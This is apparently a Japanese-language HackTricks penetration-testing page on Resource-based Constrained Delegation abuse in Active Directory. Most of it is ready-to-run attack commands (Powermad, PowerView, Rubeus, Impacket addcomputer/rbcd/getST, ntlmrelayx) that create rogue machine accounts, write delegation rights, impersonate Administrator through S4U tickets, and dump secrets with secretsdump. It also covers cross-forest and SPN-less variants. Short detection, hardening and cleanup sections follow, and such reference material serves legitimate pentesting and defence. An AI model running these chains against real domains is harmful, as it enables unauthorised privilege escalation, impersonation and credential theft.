# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation の基礎

これは基本的な [Constrained Delegation](constrained-delegation.md) に似ていますが、**異なる点は**、**オブジェクト**に対して**任意のユーザーをマシンに対して impersonate する**権限を与えるのではなく、Resource-based Constrain Delegation では、**自身に対して任意のユーザーを impersonate できるオブジェクト**を設定することです。<sup>[[12]](#references)</sup>

この場合、制約対象のオブジェクトには _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ という属性があり、そこには自身に対して他の任意のユーザーを impersonate できるユーザーの名前が設定されます。

この Constrained Delegation と他の Delegation の重要な違いは、**マシンアカウントに対する write 権限**（_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_）を持つ任意のユーザーが、**_msDS-AllowedToActOnBehalfOfOtherIdentity_** を設定できることです（他の形式の Delegation では domain admin 権限が必要でした）。<sup>[[1]](#references)</sup>

### 新しい概念

Constrained Delegation では、**S4U2Self** を実行するために、ユーザーの _userAccountControl_ 値内にある **`TrustedToAuthForDelegation`** フラグが必要だと説明しました。しかし、これは完全には正しくありません。\
実際には、その値がなくても、**service**（SPN を持つ）であれば任意のユーザーに対して **S4U2Self** を実行できます。ただし、**`TrustedToAuthForDelegation`** が**ある**場合、返される TGS は **Forwardable** になり、そのフラグが**ない**場合、返される TGS は **Forwardable** には**なりません**。<sup>[[5]](#references)</sup>

ただし、**S4U2Proxy** で使用する **TGS** が **NOT Forwardable** の場合、**basic Constrain Delegation** を悪用しようとしても**機能しません**。一方、**Resource-Based constrain delegation** を exploit しようとしている場合は、**機能します**。<sup>[[1]](#references)[[2]](#references)</sup>

### 攻撃の構成

> **Computer** アカウントに対する **write equivalent privileges** がある場合、そのマシン上で**特権アクセス**を取得できます。

攻撃者がすでに**被害者コンピューターに対する write equivalent privileges** を持っているとします。

1. 攻撃者は **SPN** を持つアカウントを **compromise** するか、アカウントを**作成**します（「Service A」）。なお、他に特別な権限を持たない _Admin User_ でも、最大 10 個の Computer オブジェクト（**_MachineAccountQuota_**）を**作成**し、それらに **SPN** を設定できます。そのため、攻撃者は Computer オブジェクトを作成して SPN を設定するだけで済みます。
2. 攻撃者は被害者コンピューター（ServiceB）に対する **WRITE 権限**を **abuse** し、ServiceA が被害者コンピューター（ServiceB）に対して任意のユーザーを impersonate できるように、**resource-based constrained delegation** を設定します。
3. 攻撃者は Rubeus を使用し、Service A から Service B に対して、**Service B への特権アクセス**を持つユーザーのために**完全な S4U attack**（S4U2Self および S4U2Proxy）を実行します。
1. S4U2Self（SPN を compromise または作成したアカウントから）：**Administrator から自分自身への TGS** を要求します（Not Forwardable）。
2. S4U2Proxy：前の手順で取得した **not Forwardable TGS** を使用し、**Administrator** から**被害者ホスト**への **TGS** を要求します。
3. not Forwardable TGS を使用していても、Resource-based constrained delegation を exploit しているため、機能します。
4. 攻撃者は **pass-the-ticket** を実行し、ユーザーを **impersonate** して被害者の ServiceB への**アクセス**を取得できます。<sup>[[1]](#references)</sup>

ドメインの _**MachineAccountQuota**_ を確認するには、次を使用します：
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## 攻撃

### コンピューターオブジェクトの作成

**[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> を使用して、domain 内に computer object を作成できます。
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Resource-based Constrained Delegation の設定

**activedirectory PowerShell module の使用**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**PowerView の使用**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### 完全な S4U attack の実行 (Windows/Rubeus)

まず、新しい Computer object を password `123456` で作成したため、その password の hash が必要です:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
これにより、そのアカウントの RC4 および AES ハッシュが出力されます。\
これで、攻撃を実行できます：<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Rubeus の `/altservice` param を使えば、一度リクエストするだけで、より多くの services 用の tickets を生成できます。
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> ユーザーには "**Cannot be delegated**" という属性があることに注意してください。ユーザーのこの属性が True に設定されている場合、そのユーザーになりすますことはできません。このプロパティは bloodhound 内で確認できます。

### Linux tooling: Impacket によるエンドツーエンドの RBCD（2024年以降）

Linux から操作する場合、公式の Impacket tools を使用して RBCD chain 全体を実行できます。<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- LDAP signing/LDAPS が強制されている場合は、`impacket-rbcd -use-ldaps ...` を使用します。
- AES keys を優先してください。多くの modern domains では RC4 が制限されています。Impacket と Rubeus はどちらも AES-only flows をサポートしています。
- Impacket は一部の tools で `sname`（"AnySPN"）を書き換えられますが、可能な限り正しい SPN を取得してください（例: CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

## Cross-domain & cross-forest RBCD

**delegating principal** を制御しており、それが **resource computer** とは **different domain**（または **different forest**）に存在する場合でも、abuse は依然として **RBCD** です。ただし、ticket flow は通常の単一ドメインにおける `S4U2Self -> S4U2Proxy` ではなくなります。

### Cross-domain RBCD: configure the foreign principal by SID

**different domain** から `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定する場合、foreign machine/user は target domain LDAP で **name によって resolvable ではない** 可能性があります。その場合は、foreign principal の sAMAccountName/UPN ではなく、その **SID** を使用して delegation entry を設定します。

これは、NTLM を `ntlmrelayx.py` で LDAP に relay する場合に特に重要です:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Notes:
- `--sid` は、`--escalate-user` を SID として扱うよう `ntlmrelayx.py` に指示します。委任アカウントがターゲットドメインに属していない場合に必要です。
- tool が `User not found in LDAP` と表示しても、security descriptor が foreign SID を直接保存するため、委任の書き込みは成功する場合があります。

### Cross-domain RBCD: cross-realm S4U sequence

foreign principal が `msDS-AllowedToActOnBehalfOfOtherIdentity` に登録されると、動作する cross-domain の flow は次のとおりです。<sup>[[9]](#references)[[13]](#references)</sup>

1. 委任元 principal の own domain から **TGT** を取得する。
2. `krbtgt/<target-domain>` の **referral TGT** を要求する。
3. target-domain DC 上で、impersonate する user の **cross-realm S4U2Self referral** を要求する。
4. delegator domain に戻り、その user の実際の **S4U2Self** ticket を要求する。
5. delegator domain で **S4U2Proxy** を実行し、target domain 用の referral ticket を取得する。
6. target-domain DC 上で最後の **S4U2Proxy** を実行し、`cifs/host.target`、`host/host.target` などの service ticket を取得する。

このため、stock Linux tooling は cross-domain RBCD で失敗することがよくあります。<sup>[[9]](#references)</sup>
- request の **realm** は、`TGS-REQ` で使用する TGT の realm と異なる必要がある場合がある
- chain には **independent S4U2Proxy steps** が必要であり、`S4U2Self` だけ、または `S4U2Self` の直後に単一の `S4U2Proxy` を実行するだけでは不十分

### Cross-domain RBCD from Linux

Synacktiv は、2 つの KDC を明示的に処理することで、Linux から cross-realm sequence を再現する Impacket `getST.py` implementation を公開しました。<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
実運用上、新しい引数は次のとおりです:
- `-dc-ip`: **delegating** domain の DC
- `-targetdomain`: **resource computer** の domain
- `-targetdc`: **resource** domain の DC

### Cross-forest RBCD の制限

Cross-forest RBCD には重要な制限があります: **impersonated user は delegating principal と同じ forest に所属していなければなりません**。つまり、管理下の machine account が `valhalla.local` にあり、target resource が `asgard.local` にある場合、通常、RBCD を介して任意の `asgard.local` user をその resource に対して impersonate することは**できません**。<sup>[[9]](#references)</sup>

次の場合には引き続き exploit 可能です:
- **delegating forest** の user が、他方の forest の resource host に対する **local admin**（またはその他の privileged user）である
- trust により必要な authentication path が許可され、foreign SID が target computer の security descriptor で受け入れられる

### Cross-forest RBCD の protocol quirks

Cross-forest RBCD は、単なる「cross-domain + trust」ではありません。確認された flow には、一般的な tooling が歴史的に見落としている2つの quirks があります:<sup>[[9]](#references)</sup>

1. `PA-PAC-OPTIONS=branch-aware` を設定する追加の **S4U2Proxy** request
2. 他の etype が要求されている場合でも、最終的な service ticket が **RC4** で返されることがある

実際の flow は次のとおりです:

1. forest A の delegating principal に対する TGT を取得する。
2. forest A で impersonated user に対する **S4U2Self** を request する。
3. forest A で **S4U2Proxy** を request し、forest B に対する referral TGT を取得する。
4. forest A で、S4U2Self ticket を additional ticket として指定**せず**、`branch-aware` を有効にして2回目の **S4U2Proxy** を送信し、forest B に対する別の referral TGT を取得する。
5. 任意で、forest B の delegating principal に対する通常の service ticket を request する（この ticket は最終的な abuse には不要）。
6. 手順3と4の referral ticket を使用して、forest B で target SPN に対する impersonated forest-A user 用の最終的な **S4U2Proxy** ticket を request する。

### Linux からの Cross-forest RBCD

同じ Synacktiv の Impacket branch は、この logic 用に `-forest` switch を追加しています:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

**multi-domain forests** では、**S4U2Self** と **S4U2Proxy** は、1 回の referral の後に停止せず、**recursive** になる場合があります。

- **Recursive S4U2Self**: 最初の `S4U2Self` は **impersonated user の domain** に送信され、中間の parent/child hop は `krbtgt/<REALM>` に対する通常の `TGS-REQ` referral で通過し、**final S4U2Self** は **delegating principal 自身の domain** に送信されます。
- つまり、マシンアカウントの **TGT** を保持しているだけで、同一 forest 内の別 domain の **admin** になりすまし、`cifs/host`、`host/host`、`wsman/host` などを要求できる場合があります。
- **Recursive S4U2Proxy** も同様に trust chain をたどります。中間の hop では、次の `krbtgt/<REALM>` referral を要求する際に、直前の ticket を TGT として再利用し、最後の hop だけが最終的な service ticket を返します。<sup>[[10]](#references)</sup>

実際の same-forest の例は次のとおりです。
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

**delegating principal が SPN を持たない user の場合、最後の recursive `S4U2Self` は **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** で失敗します。回避策は、最後の hop のみを **`S4U2Self+U2U`** として再試行することです。**<sup>[[10]](#references)</sup>

abuse chain の概要：

1. **NT hash** で Authenticate し、KDC が **RC4-HMAC (etype 23)** を使用するよう誘導します。
2. 最初に **`-self -u2u`** を要求し、その ticket を後続の proxy step 用の ticket とは分けて保持します。
3. `describeTicket.py` で **TGT session key** を抽出します。
4. `changepasswd.py -newhashes <session_key>` を使用して、user の **NT hash** をその **session key** に置き換えます。
5. `S4U2Self+U2U` ticket を、別個の **`-proxy`** request における **`-additional-ticket`** として再利用します。
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
運用上の注意点:

- **最初の trusted hop がすでに別の forest である**場合は、Windows のネイティブ動作に合わせるため、**branch-aware**アルゴリズム（`getST.py ... -forest`）を優先してください。チェーンの**後段で初めて**foreign forest に到達する場合は、branch-aware ではない recursive flow でも動作する可能性があります。<sup>[[9]](#references)</sup>
- 最近の **Windows Server 2022/2025** DC では、RC4 の非推奨化により、強制した RC4 が **`KDC_ERR_ETYPE_NOSUPP`** で失敗することがあります。この場合、従来の SPN-backed RBCD は AES で動作していても、**SPN-less RBCD が不可能**になることがあります。<sup>[[15]](#references)</sup>
- ユーザーの hash/password を変更する前に **`S4U2Self+U2U`** を実行してください。`SamrChangePasswordUser` はアカウントの Kerberos AES keys を再計算しないため、先に password を変更すると、後続の ticket requests が失敗する可能性があります。<sup>[[14]](#references)</sup>
- impersonate されるアカウントは、依然として **delegable** でなければなりません。**Protected Users** および **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** が設定されたアカウントは、このチェーンをブロックします。

## Detection / hardening notes

- domain/forest をまたぐ RBCD paths は、現在も通常、**ACL abuse** または **relay-to-LDAP** によって作成されます。DC で **LDAP signing** と **LDAP channel binding** を強制し、一般的な setup paths を遮断してください。
- computer objects 上の `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き込めるユーザーを監査し、保存されている SIDs（**foreign security principals** を含む）を解決してください。
- trust-heavy environments では、**Selective Authentication**、**SID filtering**、および foreign forest のユーザーが resource hosts 上で **local admin** 権限を持っているかどうかを確認してください。

### Accessing

最後の command line は、**complete S4U attack** を実行し、Administrator から victim host への **TGS** を **memory** に inject します。\
この例では Administrator から **CIFS** service 用の TGS をリクエストしているため、**C$** にアクセスできます:
```bash
ls \\victim.domain.local\C$
```
### 異なる service tickets の Abuse

[**利用可能な service tickets はこちら**](silver-ticket.md#available-services)で確認できます。

## Enumerating、監査、クリーンアップ

### RBCD が設定されたコンピューターを Enumerate する

PowerShell（SD を decode して SID を解決）：
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket（1つのコマンドで読み取りまたはフラッシュ）:
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### RBCD のクリーンアップ / リセット

- PowerShell（属性をクリア）：
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos のエラー

- **`KDC_ERR_ETYPE_NOTSUPP`**: これは、Kerberos が DES または RC4 を使用しないように設定されており、RC4 hash だけを指定していることを意味します。Rubeus に少なくとも AES256 hash を指定してください（または rc4、aes128、aes256 hash をすべて指定してください）。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 通常のユーザーに対する `-self` 実行中の **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: 委任元 principal に **SPN がない**可能性があります。通常の **`S4U2Self`** ではなく、**`S4U2Self+U2U`** として **最後の hop** を再試行してください。<sup>[[10]](#references)</sup>
- **SPN-less RBCD** 実行中の **`KDC_ERR_ETYPE_NOSUPP`**: 最近の DC では、`S4U2Self+U2U` と session-key-substitution の trick に必要な、強制された **RC4-HMAC** path が拒否される場合があります。代わりに AES を使用する、従来の **SPN-backed** RBCD path を試してください。<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: これは、現在の computer の時刻が DC の時刻と異なり、Kerberos が正常に動作していないことを意味します。
- **`preauth_failed`**: これは、指定した username と hash では login できないことを意味します。hash を生成する際に、username 内の "$" を入れ忘れた可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: 次のいずれかを意味する可能性があります:
- impersonate しようとしている user が、目的の service にアクセスできない（impersonate できない、または十分な privileges がないため）
- 要求した service が存在しない（winrm の ticket を要求したが、winrm が実行されていない場合）
- 作成した fakecomputer が vulnerable server に対する privileges を失っており、再付与する必要がある。
- classic KCD を abuse している。RBCD は non-forwardable S4U2Self ticket で動作しますが、KCD には forwardable が必要です。

## Notes、relay、代替手段

- LDAP が filtered の場合、AD Web Services（ADWS）経由で RBCD SD を書き込むこともできます。以下を参照してください:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chain は、1 step で local SYSTEM を取得するために、RBCD で終了することがよくあります。実践的な end-to-end の例については、以下を参照してください:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel binding が **disabled** で、machine account を作成できる場合、**KrbRelayUp** などの tool を使用して、強制した Kerberos auth を LDAP に relay し、target computer object 上で自身の machine account に対する `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定し、off-host から S4U 経由で直ちに **Administrator** を impersonate できます。<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Another Word on Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Object Takeover](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Resource-Based Constrained Delegation Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: An Offensive Kerberos Overview](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Quick Linux cheatsheet with recent syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
